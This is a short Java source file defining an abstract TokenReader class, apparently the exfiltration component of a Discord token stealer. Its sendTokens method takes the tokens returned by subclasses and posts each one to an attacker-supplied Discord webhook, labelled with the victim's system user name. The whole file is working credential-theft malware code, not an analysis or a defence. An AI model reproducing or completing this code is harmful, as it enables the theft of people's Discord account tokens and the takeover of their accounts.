package util;

import java.awt.*;
import java.io.IOException;
import java.util.Map;

public abstract class TokenReader {
    DiscordWebhook webhook;
    public void setDiscordWebhook(String url) {
        this.webhook = new DiscordWebhook(url);
    }

    private String cleanString(String input) {
        return input.replace("\"", "");
    }

    public void sendTokens(String nameFrom) {
        try {
            if(this.webhook == null) throw new Exception("Missing discord webhook. Use setDiscordWebhook(url)");
            Map<String, String> map = this.getTokens();
            for(String key : map.keySet()) {
                webhook.clearEmbeds();
                webhook.addEmbed(new DiscordWebhook.EmbedObject()
                        .setTitle(cleanString(key))
                        .setDescription(cleanString(map.get(key)))
                        .setFooter(nameFrom + " token - " + System.getProperty("user.name"), null)
                        .setColor(Color.green));
                webhook.execute();
            }
        } catch (Exception e) {
            System.out.println("Failed to send tokens: " + e.getMessage());
        }
    }

    public Map<String, String> getTokens() throws IOException {
        return null;
    }

}
